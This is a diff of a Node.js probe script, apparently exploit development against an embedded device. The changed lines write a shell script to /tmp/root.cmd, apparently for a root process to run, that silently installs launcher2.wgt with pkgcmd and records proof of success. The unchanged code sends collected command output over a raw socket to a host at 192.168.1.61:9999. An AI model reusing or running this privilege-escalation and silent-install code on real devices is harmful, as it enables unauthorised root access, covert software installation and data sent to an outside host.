@@ -6,7 +6,7 @@ var http = require('http');
 var net = require('net');
 var HOST='192.168.1.61', PORT=9999;
 var BASE='/home/owner/share/tmp/sdk_tools';
-var R={ts:new Date().toISOString(), probe:'p140', results:{}, log:[]};
+var R={ts:new Date().toISOString(), probe:'p140b', results:{}, log:[]};
 var posted=false;
 function L(s){R.log.push(String(s).substring(0,500));}
 function postBuf(path,buf){try{var hdr='POST '+path+' HTTP/1.1\r\nHost: '+HOST+':'+PORT+'\r\nContent-Type: application/octet-stream\r\nContent-Length: '+buf.length+'\r\nConnection: close\r\n\r\n';var s=net.connect(PORT,HOST);s.on('connect',function(){s.write(hdr);s.write(buf);setTimeout(function(){s.destroy()},5000)});s.on('error',function(e){L('post err '+e.message)});}catch(e){L('post ctor '+e);}}
@@ -30,10 +30,12 @@ function main(){
     else {
       R.results.download='[http '+status+'] '+len+'B';
       R.results.ls=run('ls -la '+BASE+'/launcher2.wgt; md5sum '+BASE+'/launcher2.wgt 2>&1',10000,1000);
-      var script='#!/bin/sh\npkgcmd -i -t wgt -p '+BASE+'/launcher2.wgt -q -G\n#END\n';
+      var script='#!/bin/sh\nwhich pkgcmd > '+BASE+'/pkgproof.txt 2>&1\npkgcmd -i -t wgt -p '+BASE+'/launcher2.wgt -q -G >> '+BASE+'/pkgproof.txt 2>&1\necho rc=$? >> '+BASE+'/pkgproof.txt\n#END\n';
       try { fs.writeFileSync('/tmp/root.cmd', script); R.results.rootcmd='[written]'; }
       catch(e){ R.results.rootcmd='ERR '+String(e); }
-      R.results.rootcmdls=run('ls -la /tmp/root.cmd; tail -2 /tmp/root.cmd 2>&1',10000,1000);
+      R.results.rootcmdls=run('ls -la /tmp/root.cmd; tail -3 /tmp/root.cmd 2>&1',10000,1000);
+      run('sleep 8',10000,100);
+      R.results.proof=run('cat '+BASE+'/pkgproof.txt 2>&1',10000,4000);
     }
     R.results.final='done '+new Date().toISOString();
     L('done');
